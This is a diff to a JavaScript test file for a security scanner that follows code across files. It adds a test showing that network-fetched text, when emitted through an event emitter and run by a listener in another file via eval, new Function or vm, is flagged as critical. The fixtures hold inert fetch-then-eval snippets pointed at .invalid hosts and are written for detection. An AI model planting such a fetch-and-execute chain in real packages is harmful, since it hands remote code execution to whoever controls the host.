@@ -2,7 +2,8 @@
 // (lib/crossfile.js, twin of core._cross_file_received_issues), which the
 // --deps checks run. python/tests/scanner/test_cross_file_follower.py has
 // the full cases (the forms, the adversarial pass, the crafted false
-// positives) and tests/architecture/test_js_parity_crossfile.py compares the
+// positives, the event emitter of 0.1.8) and
+// tests/architecture/test_js_parity_crossfile.py compares the
 // engines on them and on a generated stream. Inert text: hosts are .invalid,
 // nothing is executed.
 
@@ -51,6 +52,28 @@ test("crafted false positives stay quiet", () => {
   assert.deepEqual(found(js({ "util.js": "exports.execute = (code) => eval(code);\n",
     "index.js": "const { execute } = require('./util');\nconst https = require('https');\nexecute('1 + 1');\n" })), []);
   assert.deepEqual(found(py({ "pkg/_net.py": PY_NET, "pkg/run.py": "from ._net import pull\n# exec(pull()) would be unsafe\ndata = pull()\n" })), []);
+});
+
+test("an event emitter: a value emitted in one file, run by a listener in another (0.1.8)", () => {
+  const net = "const EventEmitter = require('events');\nconst bus = new EventEmitter();\n"
+    + "fetch(" + U + ").then((r) => r.text()).then((c) => bus.emit('code', c));\nmodule.exports = { bus };\n";
+  for (const run of ["const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n",
+    "const { bus } = require('./net');\nbus.on('code', eval);\n",
+    "const { bus } = require('./net');\nbus.once('code', function (src) {\n  new Function(src)();\n});\n"]) {
+    assert.deepEqual(found(js({ "net.js": net, "run.js": run })), [["node_modules/pkg/run.js", "CRITICAL", RECEIVED]], run);
+  }
+  assert.deepEqual(found(js({ "net.js": "fetch(" + U + ").then((r) => r.text()).then((b) => process.emit('boot', b));\n",
+    "run.js": "process.on('boot', (x) => { require('vm').runInThisContext(x); });\n" })),
+  [["node_modules/pkg/run.js", "CRITICAL", RECEIVED]]);
+  // quiet: a constant emitted, a listener that logs, another event, both ends in one file
+  const quiet = [
+    { "net.js": net.replace("bus.emit('code', c)", "bus.emit('code', 'console.log(1)')"),
+      "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n" },
+    { "net.js": net, "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => console.log(c));\n" },
+    { "net.js": net, "run.js": "const { bus } = require('./net');\nbus.on('data', (c) => eval(c));\n" },
+    { "net.js": net + "bus.on('code', (c) => eval(c));\n", "other.js": "module.exports = 1;\n" },
+  ];
+  for (const files of quiet) assert.deepEqual(found(js(files)), [], JSON.stringify(files));
 });
 
 test("--deps runs the follower; a file already flagged CRITICAL is left alone", () => {
